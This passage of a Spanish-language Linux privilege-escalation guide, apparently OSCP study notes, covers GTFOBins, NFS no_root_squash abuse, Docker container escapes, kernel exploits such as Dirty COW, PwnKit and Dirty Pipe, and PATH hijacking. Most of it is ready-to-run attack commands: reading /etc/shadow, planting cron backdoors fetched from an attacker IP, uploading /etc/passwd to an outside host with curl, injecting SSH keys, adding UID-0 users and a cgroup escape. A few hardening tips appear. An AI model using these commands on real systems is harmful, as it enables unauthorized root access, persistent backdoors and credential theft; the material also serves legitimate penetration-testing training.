**2. Buscar procesos espec√≠ficos**
```bash
./pspy64 -pf | grep -i "backup\|cron\|root"
```

**3. Monitorear directorio espec√≠fico**
```bash
./pspy64 -f -d /opt -d /var/www
```

**4. Combinar con watch para tiempo real**
```bash
watch -n 1 'cat pspy_output.txt | tail -20'
```

#### Limitaciones

- ‚ùå **No muestra variables de entorno** de los procesos
- ‚ùå **Puede perder procesos muy r√°pidos** (< intervalo de escaneo)
- ‚ùå **Consume CPU** si el intervalo es muy bajo

**Repositorio**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

---

### GTFOBins - Bypass de Restricciones con Binarios Unix

**GTFOBins** es una base de datos curada de binarios Unix que pueden ser usados para **bypass de restricciones de seguridad** en sistemas mal configurados.

**Sitio web**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
**Repositorio**: [https://github.com/GTFOBins/GTFOBins.github.io](https://github.com/GTFOBins/GTFOBins.github.io)

#### ¬øQu√© es GTFOBins?

**GTFO** = "Get The Fuck Out" (salir de restricciones)

GTFOBins cataloga binarios que permiten:
- üîì **Shell**: Ejecutar shell interactivo
- üì§ **File upload**: Subir archivos
- üì• **File download**: Descargar archivos
- üìÑ **File read**: Leer archivos
- ‚úçÔ∏è **File write**: Escribir archivos
- üìö **Library load**: Cargar librer√≠as personalizadas
- üîç **SUID**: Explotar si tienen bit SUID
- üîë **Sudo**: Explotar si se pueden ejecutar con sudo
- üéØ **Capabilities**: Explotar Linux capabilities
- üêö **Limited shell**: Bypass de shells restringidos
- üåê **Reverse shell**: Obtener reverse shell
- üì¶ **File transfer**: Transferir archivos

#### C√≥mo Usar GTFOBins

**Escenario 1: Encontraste binario SUID**
```bash
find / -perm -4000 2>/dev/null
# -rwsr-xr-x 1 root root 137K Sep  5  2019 /usr/bin/base64
```

**Paso 1**: Ir a https://gtfobins.github.io/
**Paso 2**: Buscar "base64"
**Paso 3**: Click en "SUID"
**Paso 4**: Copiar y adaptar el comando

```bash
# GTFOBins dice:
LFILE=/etc/shadow
./base64 "$LFILE" | base64 --decode

# Ejecutar:
/usr/bin/base64 /etc/shadow | base64 --decode
```

**Escenario 2: Tienes sudo en binario espec√≠fico**
```bash
sudo -l
# User alice may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/find
```

**Paso 1**: Buscar "find" en GTFOBins
**Paso 2**: Click en "Sudo"
**Paso 3**: Usar comando:

```bash
sudo find . -exec /bin/sh \; -quit
```

#### Categor√≠as en GTFOBins

**1. Shell**
- Binarios que pueden spawn un shell
- Ejemplo: `vim`, `less`, `more`, `man`, `awk`

**2. Command execution**
- Ejecutar comandos arbitrarios
- Ejemplo: `find`, `tar`, `rsync`, `git`

**3. File read**
- Leer archivos que normalmente no podr√≠amos
- Ejemplo: `base64`, `base32`, `xxd`, `od`, `nl`

**4. File write**
- Escribir en archivos privilegiados
- Ejemplo: `tee`, `cp`, `mv`, `dd`

**5. SUID**
- Explotar binarios con SUID bit
- Mantener efectiveUID elevado

**6. Sudo**
- Abusar de permisos sudo mal configurados

**7. Capabilities**
- Explotar Linux capabilities

#### Ejemplos Pr√°cticos

**1. Leer /etc/shadow con base64 SUID**
```bash
/usr/bin/base64 /etc/shadow | base64 --decode
```

**2. Escribir en archivo privilegiado con tee**
```bash
echo "malicious_content" | sudo tee /etc/cron.d/backdoor
```

**3. Shell desde vim con sudo**
```bash
sudo vim -c ':!/bin/bash'
```

**4. Upload de archivo con curl**
```bash
# Recibir archivo v√≠a upload
curl -X POST -F "file=@/etc/passwd" http://10.10.14.50/upload
```

**5. Download con wget**
```bash
sudo wget http://10.10.14.50/malicious.sh -O /etc/cron.daily/backdoor
```

#### Tips para Usar GTFOBins

**1. Siempre verifica versi√≥n del binario**
```bash
vim --version
# Algunas t√©cnicas solo funcionan en versiones espec√≠ficas
```

**2. Combina t√©cnicas**
```bash
# Si tienes sudo en find, puedes leer archivos Y ejecutar comandos
sudo find /etc/shadow -exec cat {} \;
sudo find . -exec /bin/bash \; -quit
```

**3. Busca binarios alternativos**
```bash
# Si no tienes vim, prueba:
# - vi
# - nano
# - emacs
# - ed
```

**4. Usa file read + file write para privesc**
```bash
# Leer /etc/shadow
base64 /etc/shadow | base64 -d > /tmp/shadow

# Crackear
john /tmp/shadow

# Escribir nuevo usuario en /etc/passwd
echo 'hacker:$1$xyz$hash...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
```

#### GTFOBins vs GTFOBLookup (CLI)

**GTFOBLookup** es una herramienta CLI para consultar GTFOBins offline:

```bash
# Instalar
git clone https://github.com/norbemi/GTFOBLookup
cd GTFOBLookup
pip3 install -r requirements.txt

# Usar
python3 gtfoblookup.py -b find

# Buscar por funci√≥n espec√≠fica
python3 gtfoblookup.py -b find -f sudo
```

**Repositorio**: [https://github.com/norbemi/GTFOBLookup](https://github.com/norbemi/GTFOBLookup)

---

### LinEnum - Script de Enumeraci√≥n Cl√°sico

**LinEnum** es un script de enumeraci√≥n m√°s antiguo que LinPEAS pero a√∫n muy √∫til y menos detectado por AV.

```bash
# Descargar
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# Ejecuci√≥n b√°sica
./LinEnum.sh

# Thorough mode (m√°s completo)
./LinEnum.sh -t

# Con keyword search (buscar passwords)
./LinEnum.sh -k password

# Generar reporte
./LinEnum.sh -t -r enum_report

# Export a HTML
./LinEnum.sh -t -e html -r report.html
```

**Ventajas de LinEnum**:
- ‚úÖ Menos detectado que LinPEAS
- ‚úÖ M√°s simple y f√°cil de leer
- ‚úÖ Genera reportes bonitos

**Desventajas**:
- ‚ùå Menos completo que LinPEAS
- ‚ùå No destaca hallazgos cr√≠ticos con colores

**Repositorio**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

---

### Linux Exploit Suggester - Buscar Exploits de Kernel

**Linux Exploit Suggester** (LES) busca exploits conocidos para la versi√≥n del kernel actual.

```bash
# Descargar
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh

# Ejecutar
./linux-exploit-suggester.sh

# Output con m√°s detalle
./linux-exploit-suggester.sh -k $(uname -r)

# Buscar exploits espec√≠ficos
./linux-exploit-suggester.sh --kernelversion 4.4.0
```

**Output ejemplo**:
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=20.04
   Download URL: https://codeload.github.com/ly4k/PwnKit/zip/main
```

**Workflow con LES**:

1. Ejecutar LES en target
2. Identificar exploits probables
3. Descargar exploit en Kali
4. Compilar (si es necesario)
5. Transferir a target
6. Ejecutar y obtener root

**Repositorio**: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

---

## üåê NFS Exploitation - Network File System

**NFS** (Network File System) es un protocolo que permite compartir directorios entre sistemas Linux/Unix. Configuraciones incorrectas pueden permitir escalada de privilegios.

### ¬øQu√© es NFS y por qu√© es peligroso?

NFS permite montar directorios remotos como si fueran locales. El problema surge cuando:
- ‚úÖ NFS est√° configurado con **no_root_squash**
- ‚úÖ Permite acceso desde nuestra IP
- ‚úÖ Los directorios compartidos contienen archivos sensibles

**no_root_squash** = El UID 0 (root) en cliente se mapea a UID 0 (root) en servidor.

Por defecto, NFS usa **root_squash** (mapea root ‚Üí nobody), pero **no_root_squash** deshabilita esta protecci√≥n.

### Enumeraci√≥n de NFS

#### Desde nuestra m√°quina de ataque

```bash
# Escanear puerto NFS (2049)
nmap -p 2049 -sV 10.10.10.50

# Enumerar shares NFS
nmap -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.10.10.50

# Showmount (m√°s simple)
showmount -e 10.10.10.50

# Output ejemplo:
# Export list for 10.10.10.50:
# /srv/nfs     *
# /home/backup 10.10.14.0/24
```

**Interpretaci√≥n**:
- `/srv/nfs *` ‚Üí Accesible desde cualquier IP
- `/home/backup 10.10.14.0/24` ‚Üí Solo accesible desde red 10.10.14.0/24

#### Desde dentro del sistema comprometido

```bash
# Ver configuraci√≥n de NFS
cat /etc/exports

# Ejemplo de configuraci√≥n VULNERABLE:
# /srv/nfs *(rw,no_root_squash,no_subtree_check)

# Ver montajes NFS actuales
mount | grep nfs
df -h | grep nfs
cat /etc/fstab | grep nfs
```

### Explotar no_root_squash

**Escenario**: Encontramos share NFS con **no_root_squash** desde nuestra m√°quina atacante.

#### M√©todo 1: Copiar /bin/bash con SUID

```bash
# Paso 1: Montar el share NFS en Kali
mkdir /tmp/nfs
mount -o rw 10.10.10.50:/srv/nfs /tmp/nfs

# Paso 2: Verificar que mont√≥ correctamente
df -h | grep nfs
ls -la /tmp/nfs

# Paso 3: Copiar bash y darle SUID (desde Kali como root)
cp /bin/bash /tmp/nfs/bash
chmod +xs /tmp/nfs/bash

# Paso 4: En la m√°quina target
cd /srv/nfs
ls -la bash
# -rwsr-sr-x 1 root root 1.2M Jan 10 12:00 bash

# Paso 5: Ejecutar bash con privilegios
./bash -p

# Paso 6: Verificar
whoami  # root
id      # uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```

**Nota**: `-p` en bash preserva el effective UID.

#### M√©todo 2: Payload personalizado en C

```bash
# Paso 1: Crear payload en Kali
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

# Paso 2: Compilar
gcc /tmp/shell.c -o /tmp/nfs/shell

# Paso 3: Dar SUID (como root en Kali)
chmod +xs /tmp/nfs/shell

# Paso 4: En target, ejecutar
cd /srv/nfs
./shell
whoami  # root
```

#### M√©todo 3: SSH Key Injection

```bash
# Si /root/.ssh est√° en NFS share
mkdir /tmp/nfs/root/.ssh 2>/dev/null

# Generar par de claves SSH en Kali
ssh-keygen -f nfs_key -N ''

# Copiar clave p√∫blica al authorized_keys
cat nfs_key.pub > /tmp/nfs/root/.ssh/authorized_keys
chmod 600 /tmp/nfs/root/.ssh/authorized_keys
chmod 700 /tmp/nfs/root/.ssh

# Conectar como root
ssh -i nfs_key root@10.10.10.50
```

#### M√©todo 4: Cron Job Injection

```bash
# Si /etc/cron.d est√° en NFS share
echo '* * * * * root chmod +s /bin/bash' > /tmp/nfs/etc/cron.d/privesc

# Esperar 1 minuto
sleep 60

# En target
/bin/bash -p
```

### Explotar desde dentro (sin acceso externo)

Si estamos dentro de la m√°quina y vemos NFS con no_root_squash pero no podemos montar desde fuera:

```bash
# Ver shares locales con no_root_squash
cat /etc/exports
# /srv/nfs localhost(rw,no_root_squash)

# Crear archivo con nuestro UID
echo '#!/bin/bash\nchmod +s /bin/bash' > /srv/nfs/exploit.sh
chmod +x /srv/nfs/exploit.sh

# Necesitamos que root ejecute el script o encontrar forma de subir UID
```

### Defenderse de NFS Exploitation

**Configuraci√≥n segura en /etc/exports**:
```bash
# ‚ùå VULNERABLE
/srv/nfs *(rw,no_root_squash)

# ‚úÖ SEGURA
/srv/nfs 10.10.10.0/24(rw,root_squash,all_squash,anonuid=65534,anongid=65534)
```

**Opciones seguras**:
- `root_squash` - Mapea root ‚Üí nobody
- `all_squash` - Mapea TODOS los usuarios ‚Üí nobody
- `anonuid/anongid` - UID/GID para usuarios an√≥nimos
- IP espec√≠fica en lugar de `*`

### Tips y Tricks

**1. Listar opciones de montaje**
```bash
nfsstat -m
```

**2. Forzar UID espec√≠fico al montar**
```bash
mount -o rw,uid=0,gid=0 10.10.10.50:/srv/nfs /tmp/nfs
```

**3. Enumerar versiones de NFS**
```bash
rpcinfo -p 10.10.10.50 | grep nfs
```

**4. Desmontar**
```bash
umount /tmp/nfs
```

**Referencias**:
- [HackTricks - NFS](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [MITRE ATT&CK - Network Share Discovery (T1135)](https://attack.mitre.org/techniques/T1135/)

---

## üê≥ Docker Escape - Escapar de Contenedores

Si est√°s dentro de un contenedor Docker, estas t√©cnicas pueden permitirte escapar al host.

### Detectar si est√°s en un contenedor

```bash
# M√©todo 1: Verificar /.dockerenv
ls -la /.dockerenv
# Si existe, est√°s en Docker

# M√©todo 2: Verificar cgroups
cat /proc/1/cgroup | grep -i docker

# M√©todo 3: Verificar hostname
hostname
# Hostnames de Docker suelen ser hashes: a1b2c3d4e5f6

# M√©todo 4: Verificar filesystem
df -h
# Overlay filesystem es indicativo de Docker

# M√©todo 5: ps aux
ps aux
# Si solo hay pocos procesos, probablemente container
```

### T√©cnica 1: Socket de Docker Montado

**Problema**: Si `/var/run/docker.sock` est√° montado en el contenedor, tenemos acceso TOTAL al daemon de Docker.

```bash
# Verificar si docker socket est√° montado
ls -la /var/run/docker.sock

# Si existe, listar contenedores
docker ps

# Crear nuevo contenedor con / del host montado
docker run -v /:/hostfs -it ubuntu bash

# Dentro del nuevo contenedor
chroot /hostfs bash
whoami  # root en el HOST
```

**Alternativa si no tienes docker CLI**:
```bash
# Usar curl para interactuar con Docker API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Crear contenedor privilegiado
curl --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true,"Binds":["/:/hostfs"]}' \
  http://localhost/containers/create
```

### T√©cnica 2: Contenedor Privilegiado (--privileged)

Si el contenedor se ejecut√≥ con `--privileged`, tiene acceso casi total al host.

```bash
# Verificar si somos privileged
ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Not privileged"

# Si somos privileged, listar dispositivos del host
fdisk -l

# Montar disco del host
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Navegar al filesystem del host
cd /mnt/host
ls -la

# Escribir clave SSH en /root/.ssh
mkdir -p /mnt/host/root/.ssh
cat your_key.pub >> /mnt/host/root/.ssh/authorized_keys

# Conectar al host
ssh -i your_key root@host_ip
```

### T√©cnica 3: Capability CAP_SYS_ADMIN

Si el contenedor tiene `CAP_SYS_ADMIN`, podemos escapar.

```bash
# Verificar capabilities
capsh --print | grep cap_sys_admin

# Si tenemos CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Habilitar cgroup notify
echo 1 > /tmp/cgrp/x/notify_on_release

# Obtener path del host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Crear script de escape
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent

# Crear exploit en host
cat > /exploit.sh << 'EOF'
#!/bin/sh
chmod +s /bin/bash
EOF

chmod +x /exploit.sh

# Trigger cgroup release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# En host
/bin/bash -p
```

### T√©cnica 4: Kernel Exploit desde Container

```bash
# Buscar exploits para el kernel del HOST
uname -a

# Ejemplo: DirtyCow funciona desde containers
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123

# Login al host
su firefart  # password: password123
```

### T√©cnica 5: Montajes Inseguros

```bash
# Verificar montajes
mount | grep -E "rw|tmpfs"

# Si /etc est√° montado con rw
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Si /var/run est√° montado
# Podemos afectar servicios del host
```

### T√©cnica 6: Variables de Entorno Expuestas

```bash
# Revisar variables de entorno
env | grep -i "pass\|secret\|key\|token"

# Pueden contener:
# - Credenciales de bases de datos
# - API keys
# - Tokens de autenticaci√≥n
# - Rutas a archivos sensibles
```

### T√©cnica 7: Docker History - Secretos en Capas

```bash
# Si tienes acceso al socket, revisar historial de im√°genes
docker history --no-trunc <image_id>

# Buscar secretos en capas intermedias
docker save <image> -o image.tar
tar -xf image.tar
grep -r "password" .
```

### Herramientas de Escape

#### deepce - Docker Enumeration & Escape

```bash
# Descargar
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh

# Ejecutar
./deepce.sh

# Con exploit autom√°tico
./deepce.sh --exploit
```

**Repositorio**: [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

#### CDK - Container Penetration Toolkit

```bash
# Descargar
wget https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Evaluar escape paths
./cdk_linux_amd64 evaluate

# Auto exploit
./cdk_linux_amd64 auto-escape
```

**Repositorio**: [https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)

### Checklist de Docker Escape

```bash
# 1. ¬øEstoy en Docker?
ls /.dockerenv

# 2. ¬øSocket de Docker montado?
ls -la /var/run/docker.sock

# 3. ¬øSoy privileged?
ip link add dummy0 type dummy 2>/dev/null

# 4. ¬øQu√© capabilities tengo?
capsh --print

# 5. ¬øQu√© est√° montado?
mount

# 6. ¬øKernel vulnerable?
uname -a

# 7. ¬øVariables de entorno sensibles?
env | grep -i "pass\|key\|secret"

# 8. ¬øProcesos interesantes?
ps aux

# 9. ¬øPuertos internos del host?
netstat -antlp 2>/dev/null
```

**Referencias**:
- [HackTricks - Docker Security](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [MITRE ATT&CK - Escape to Host (T1611)](https://attack.mitre.org/techniques/T1611/)

---

## üí• Kernel Exploits - Explotaci√≥n del Kernel

Los **kernel exploits** son vulnerabilidades en el kernel de Linux que permiten escalada de privilegios. Son poderosos pero arriesgados (pueden crashear el sistema).

### ¬øCu√°ndo usar Kernel Exploits?

**Usar kernel exploits como √öLTIMO RECURSO**:
- ‚ö†Ô∏è Pueden crashear el sistema
- ‚ö†Ô∏è Dejan evidencia en logs
- ‚ö†Ô∏è Pueden corromper el filesystem
- ‚ö†Ô∏è No son sigilosos

**√ösalos solo si**:
1. No hay otros vectores disponibles
2. Est√°s en un entorno de pruebas/CTF
3. Tienes permiso para causar downtime
4. Has hecho backup/snapshot del sistema

### Buscar Kernel Exploits

#### Con Linux Exploit Suggester

```bash
# Ya cubierto antes, pero workflow completo:
./linux-exploit-suggester.sh -k $(uname -r)

# Output ejemplo:
# [+] [CVE-2021-4034] PwnKit
#    Exposure: probable
#    Tags: ubuntu=20.04
#    Download URL: https://github.com/ly4k/PwnKit/
```

#### Con searchsploit

```bash
# Buscar por versi√≥n de kernel
searchsploit linux kernel $(uname -r)

# Buscar por distribuci√≥n y versi√≥n
searchsploit ubuntu 20.04 privilege

# M√°s espec√≠fico
searchsploit linux kernel 5.4 local privilege

# Ver detalles del exploit
searchsploit -x linux/local/12345.c

# Copiar exploit a directorio actual
searchsploit -m linux/local/12345.c
```

#### Manualmente en Google

```bash
# Obtener versi√≥n exacta del kernel
uname -a
# Linux box 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux

# Buscar en Google:
# "5.4.0-42 privilege escalation exploit"
# "Ubuntu 20.04 kernel exploit"
# "CVE linux kernel 5.4"
```

### Kernel Exploits Comunes

#### 1. Dirty COW (CVE-2016-5195)

**Afecta**: Linux kernel 2.6.22 - 4.8.3

```bash
# Descargar exploit
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

# Compilar
gcc -pthread dirty.c -o dirty -lcrypt

# Ejecutar (crea usuario firefart con password que elijas)
./dirty password123

# Login
su firefart
# Password: password123

whoami  # firefart (UID 0)
```

**C√≥mo funciona**: Race condition en COW (Copy-On-Write) del kernel permite escritura en archivos read-only.

**Repositorio**: [https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)

#### 2. PwnKit (CVE-2021-4034)

**Afecta**: PolicyKit (pkexec) en todas las versiones desde 2009

```bash
# Descargar exploit
git clone https://github.com/ly4k/PwnKit
cd PwnKit

# Compilar
make

# Ejecutar
./PwnKit

# Obtienes shell root inmediatamente
whoami  # root
```

**C√≥mo funciona**: Buffer overflow en `pkexec` permite ejecutar c√≥digo arbitrario como root.

**Repositorio**: [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

#### 3. Dirty Pipe (CVE-2022-0847)

**Afecta**: Linux kernel 5.8 - 5.17

```bash
# Descargar exploit
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c

# Compilar
gcc exploit.c -o exploit

# Ejecutar (modifica /etc/passwd)
./exploit

# Login como root
su -
# Password: piped

whoami  # root
```

**C√≥mo funciona**: Flaw en pipe permite sobreescribir archivos read-only.

**Repositorio**: [https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

#### 4. Baron Samedit (CVE-2021-3156)

**Afecta**: sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1

```bash
# Verificar vulnerabilidad
sudoedit -s /

# Si vulnerable, descargar exploit
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156

# Compilar
make

# Ejecutar
./sudo-hax-me-a-sandwich

whoami  # root
```

**C√≥mo funciona**: Heap-based buffer overflow en sudo.

**Repositorio**: [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

### Compilaci√≥n de Exploits

#### En el target (si hay compilador)

```bash
# Verificar si gcc est√° instalado
which gcc

# Compilar exploit
gcc exploit.c -o exploit

# Si falta librer√≠a
gcc exploit.c -o exploit -lcrypt -pthread
```

#### Cross-compilation en Kali

```bash
# Si target es 32-bit
gcc -m32 exploit.c -o exploit

# Con flags espec√≠ficos
gcc -Wall -Wextra exploit.c -o exploit

# Est√°tico (sin dependencias)
gcc -static exploit.c -o exploit

# Verificar arquitectura del binario
file exploit
```

#### Transferir exploit a target

```bash
# M√©todo 1: HTTP Server
# En Kali:
python3 -m http.server 8000

# En target:
wget http://10.10.14.50:8000/exploit
chmod +x exploit

# M√©todo 2: nc
# En Kali:
nc -nlvp 4444 < exploit

# En target:
nc 10.10.14.50 4444 > exploit
chmod +x exploit

# M√©todo 3: base64
# En Kali:
base64 -w0 exploit > exploit_b64.txt

# En target:
echo "BASE64_STRING" | base64 -d > exploit
chmod +x exploit
```

### Tips para Kernel Exploits

**1. Siempre hacer backup antes**
```bash
# Si tienes acceso, hacer snapshot de VM
# O al menos copiar archivos cr√≠ticos
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak
```

**2. Leer el c√≥digo del exploit**
```bash
# NUNCA ejecutes exploits sin leer el c√≥digo
cat exploit.c | less

# Buscar:
# - ¬øQu√© hace exactamente?
# - ¬øModifica archivos cr√≠ticos?
# - ¬øTiene cleanup?
# - ¬øPuede crashear el sistema?
```

**3. Probar en VM primero**
```bash
# Si posible, crear VM con misma versi√≥n de kernel
# Probar exploit ah√≠ primero
```

**4. Timing de ejecuci√≥n**
```bash
# Si es sistema de producci√≥n, ejecutar en horario de menor uso
# Tener plan de rollback
```

### Base de Datos de Exploits

- **Exploit-DB**: [https://www.exploit-db.com/](https://www.exploit-db.com/)
- **CVE Details**: [https://www.cvedetails.com/](https://www.cvedetails.com/)
- **GitHub**: Buscar "CVE-XXXX-XXXX exploit"
- **Packet Storm**: [https://packetstormsecurity.com/](https://packetstormsecurity.com/)

**Referencias**:
- [HackTricks - Kernel Exploits](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits)
- [MITRE ATT&CK - Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068/)

---

## üõ£Ô∏è PATH Hijacking - Secuestro de PATH

**PATH Hijacking** es una t√©cnica que explota scripts que ejecutan comandos **sin especificar ruta absoluta**.

### ¬øQu√© es PATH?

```bash
# Ver PATH actual
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Linux busca ejecutables en estos directorios EN ORDEN
# Cuando ejecutas "ls", Linux busca:
# 1. /usr/local/sbin/ls
# 2. /usr/local/bin/ls
# 3. /usr/sbin/ls
# 4. /usr/bin/ls  ‚Üê Encuentra aqu√≠ y ejecuta
```

### Vulnerabilidad

**Script vulnerable** ejecut√°ndose como root:
```bash
#!/bin/bash
# /opt/backup.sh
echo "Backing up files..."
tar czf /backup/data.tar.gz /var/www/html
```

**Problema**: `tar` se ejecuta sin ruta absoluta (`/bin/tar`).

Si podemos controlar el PATH o escribir en un directorio del PATH que tenga prioridad, podemos ejecutar NUESTRO `tar`.

### T√©cnica 1: Modificar PATH

```bash
# Encontramos script vulnerable con sudo
sudo -l
# (ALL) NOPASSWD: /opt/backup.sh

# Leer el script
cat /opt/backup.sh
# #!/bin/bash
# tar czf /backup/data.tar.gz /var/www/html

# Crear nuestro "tar" malicioso
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/tar
echo 'chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar

# Modificar PATH para que /tmp est√© primero
export PATH=/tmp:$PATH

# Ejecutar script con sudo
sudo /opt/backup.sh

# Nuestro /tmp/tar se ejecuta como root
/tmp/rootbash -p
whoami  # root
```

### T√©cnica 2: Writable PATH Directory

```bash
# Si encontramos directorio writable en PATH del script
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Verificar permisos
ls -la /usr/local/sbin
# drwxrwxrwx 2 root root 4096 Jan 10 12:00 /usr/local/sbin

# Crear ejecutable malicioso
echo '#!/bin/bash' > /usr/local/sbin/tar
echo 'chmod +s /bin/bash' >> /usr/local/sbin/tar
chmod +x /usr/local/sbin/tar

# Cuando script se ejecute, usar√° nuestro tar
```

### T√©cnica 3: Relative Path en Cron

```bash
# Cron job vulnerable
cat /etc/crontab
# */5 * * * * root cd /scripts && ./backup.sh

# backup.sh usa rutas relativas
cat /scripts/backup.sh
# #!/bin/bash
# tar -czf backup.tar.gz *

# Problema: cd /scripts pone /scripts como directorio actual
# Si backup.sh usa PATH sin ruta absoluta...

# Crear tar malicioso en /tmp
echo '#!/bin/bash' > /tmp/tar
echo 'chmod +s /bin/bash' >> /tmp/tar
chmod +x /tmp/tar

# Modificar PATH en crontab (si podemos)
# O esperar a que el script se ejecute con PATH que incluya /tmp
```

### T√©cnica 4: Python Library Hijacking (ya cubierto)

```bash
# Si script Python usa import sin ruta absoluta
# Y podemos escribir en directorio de sys.path
python3 -c 'import sys; print("\n".join(sys.path))'

# Crear m√≥dulo malicioso
echo 'import os; os.system("chmod +s /bin/bash")' > /tmp/module.py

# Si /tmp est√° en sys.path y el script importa module
# import module ‚Üê Ejecutar√° nuestro c√≥digo
```

### Encontrar Oportunidades de PATH Hijacking

#### Con pspy

```bash
# Monitorear procesos con pspy
./pspy64 -pf

# Buscar comandos sin ruta absoluta
# CMD: UID=0 PID=1234 | backup.sh
# CMD: UID=0 PID=1234 | tar -czf backup.tar.gz
```

#### Con grep en scripts

```bash
# Buscar scripts con rutas relativas
grep -r "^[^/]" /opt/*.sh /scripts/*.sh 2>/dev/null

# Buscar espec√≠ficamente comandos comunes sin /
grep -rE "^\s*(tar|cp|mv|rm|chmod|chown|cat|ls|ps|netstat)" /opt /scripts /usr/local/bin 2>/dev/null
```

#### Verificar PATH de cron

```bash
# Ver PATH usado por cron
cat /etc/crontab | grep PATH

# PATH en cron es limitado (normalmente):
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

### Defenderse de PATH Hijacking

**En scripts que se ejecutan con privilegios elevados**:

```bash
# ‚ùå VULNERABLE
tar czf backup.tar.gz /data

# ‚úÖ SEGURO - Usar ruta absoluta
/bin/tar czf backup.tar.gz /data

# ‚úÖ SEGURO - Establecer PATH expl√≠citamente
#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
tar czf backup.tar.gz /data
```

**Verificar permisos de directorios en PATH**:
```bash
# Ning√∫n directorio en PATH deber√≠a ser writable por usuarios no privilegiados
ls -la /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin
```

---

## üî® T√©cnicas Adicionales

### Generar Hash para /etc/passwd

```bash
# Generar hash MD5 (compatible con la mayor√≠a de sistemas)
openssl passwd -1
# Pedir√° contrase√±a

# Ejemplo: password123
# $1$xyz$hash...

# Agregar usuario root2 a /etc/passwd
echo 'root2:$1$xyz$hash...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login como root2
su root2
```

### Generar Hash para /etc/shadow

```bash
# SHA-512 (m√°s seguro)
openssl passwd -6
# Pedir√° contrase√±a

# O con salt espec√≠fica
openssl passwd -6 -salt xyz password123
```

### Apropiarse de Roles (Solaris)

```bash
# Ver roles del usuario
cat /etc/user_attr

# Si tenemos roles=root
;roles=root

# Ejecutar bash con privilegios
pfexec bash
```

---

## üéì Tips para OSCP

### Checklist de Enumeraci√≥n Linux

- [ ] Kernel version y buscar exploits
- [ ] Sudo -l (comandos con sudo sin contrase√±a)
- [ ] SUID/GUID binaries
- [ ] Capabilities
- [ ] Cron jobs (systema y usuarios)
- [ ] Servicios internos (netstat, ss)
- [ ] Archivos de configuraci√≥n
- [ ] Historial de comandos (.bash_history)
- [ ] Claves SSH privadas
- [ ] Archivos con contrase√±as
- [ ] NFS shares con no_root_squash
- [ ] Docker/LXC (si estamos en container)

### Comandos R√°pidos

```bash
# Enumeraci√≥n r√°pida
uname -a; whoami; id; sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab; ls -la /etc/cron.*

# Buscar contrase√±as
grep -rinE 'password|passwd' /home /var /opt 2>/dev/null
```

### Escalada R√°pida si Tienes Usuario con Password

```bash
# Si puedes leer /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
